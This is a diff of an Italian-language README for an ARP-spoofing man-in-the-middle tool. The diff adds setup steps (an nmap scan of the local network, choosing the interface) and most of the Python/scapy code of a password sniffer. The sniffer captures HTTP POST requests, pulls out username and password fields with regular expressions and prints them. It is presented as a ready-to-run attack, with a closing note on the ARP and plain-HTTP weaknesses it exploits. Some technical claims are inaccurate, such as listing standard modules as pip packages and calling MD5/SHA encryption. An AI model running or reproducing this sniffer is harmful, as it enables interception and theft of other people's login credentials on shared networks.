@@ -13,7 +13,8 @@ Il frame ARP è composto da diverse parti, alcune di esse sono:
 * *pdst*: contiene l'indirizzo IP di destinazione
 * *hwsrc*: contiene l'indirizzo MAC sorgente
 * *psrc*: contiene l'indirizzo IP sorgente
-## Librerie
+## Preparazione
+### Librerie
 Per poter avviare il codice bisogna installare le seguenti librerie:
 * scapy
 * sys
@@ -26,6 +27,7 @@ Si possono installare col seguente comando:
 ```bash
 pip install scapy, sys, time, os, re, urllib
 ```
+### Nmap
 Se c'è bisogno di ottenere gli indirizzi IP delle vittime si può scansionare la rete con [nmap](https://nmap.org/) usando il seguente comando e sostituendo networkIP con l'indirizzo di rete e CIDR con il CIDR della rete:
 ```bash
 nmap -O networkIP/CIDR
@@ -34,6 +36,12 @@ nmap -O networkIP/CIDR
 Esempio:
 ```bash
 nmap -O 192.168.0.0/24
+```
+
+### Interfaccia di rete
+Per un corretto funzionamento inserire la propria interfaccia di rete nel file sniffer.py alla riga 50 al posto di eth0:
+```python
+iface = "eth0"
 ```
 ## Avvio
 Per avviare l'attacco bisogna aprire due terminali nella cartella in cui si trovano i due file.
@@ -118,11 +126,72 @@ def spoof(router_ip, target_ip, router_mac, target_mac):
 ## Password sniffer
 Spiegazione del codice contenuto in *sniffer.py*.
 ### Import
-
 ```python
-
+from scapy.all import *
+from urllib import parse
+import re
+from scapy.layers import http
 ```
 
+Loop:
 ```python
+# Interfaccia di rete
+iface = "eth0"
 
+try:
+    sniff(iface=iface,     # Specifica l'interfaccia di rete
+          prn=pkt_parser,  # Specifica il pacchetto da analizzare
+          store=0)
+
+# Interrompre il loop tramite tastiera
+except KeyboardInterrupt:
+    print('Exiting Sniffer')
+    exit(0)
 ```
+
+### Funzioni
+La funzione _pkt\_parser(packet)_ analizza il pacchetto inserito e ritorna username e password se ne trova:
+```python
+# Analizzatore di pacchetti
+def pkt_parser(packet):
+    # Controlla la presenza di layer HTTPRequest e se ottenuti con POST
+    if packet.haslayer(http.HTTPRequest) and packet[http.HTTPRequest].Method == b'POST':
+
+        # Ottiene i dati contenuti del pacchetto
+        raw_fields = packet[http.HTTPRequest].getlayer('Raw').fields
+        body = str(raw_fields['load'])
+
+        #Cerca username e password allinterno dei dati
+        user_pass = get_login_pass(body)
+
+        # Controlla se lo sniffer ha ottenuto un'username e una password
+        if user_pass != None:
+            print(parse.unquote(user_pass[0]))
+            print(parse.unquote(user_pass[1]))
+    else:
+        pass
+```
+
+La funzione _get\_login\_pass(body)_ cerca username e password confrontando i campi contenuti nelle liste _userfields_ e _passwordfields_ con quelli contenuti nei dati del pacchetto in analisi:
+```python
+def get_login_pass(body):
+    user = None
+    passwd = None
+
+    # Compara i campi contenuti nelle liste con quelli dei dati nel pacchetto in analisi
+    for login in userfields:
+        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
+        if login_re:
+            user = login_re.group()
+    for passfd in passfields:
+        pass_re = re.search('(%s=[^&]+)' % passfd, body, re.IGNORECASE)
+        if pass_re:
+            passwd = pass_re.group().rstrip('\'')
+
+    # Se ottiene username e password li ritorna
+    if user and passwd:
+        return (user, passwd)
+```
+
+# Vulnerabilità
+Il programma sfrutta prima di tutto la bassa sicurezza del protocollo ARP che è facilmente infettabile da un criminale per eseguire MITM, ARP poisoning e altri attacchi. Per quanto riguarda lo sniffer, questo sfrutta la mancanza di sicurezza nei siti internet sprovvisti di [HTTPS](https://it.wikipedia.org/wiki/HTTPS) o che inviano le password e gli username degli utenti “in chiaro”, ossia senza sistemi di crittografia come [MD5](https://it.wikipedia.org/wiki/MD5) o [SHA](https://it.wikipedia.org/wiki/Secure_Hash_Algorithm), tramite [PHP](https://www.php.net/).
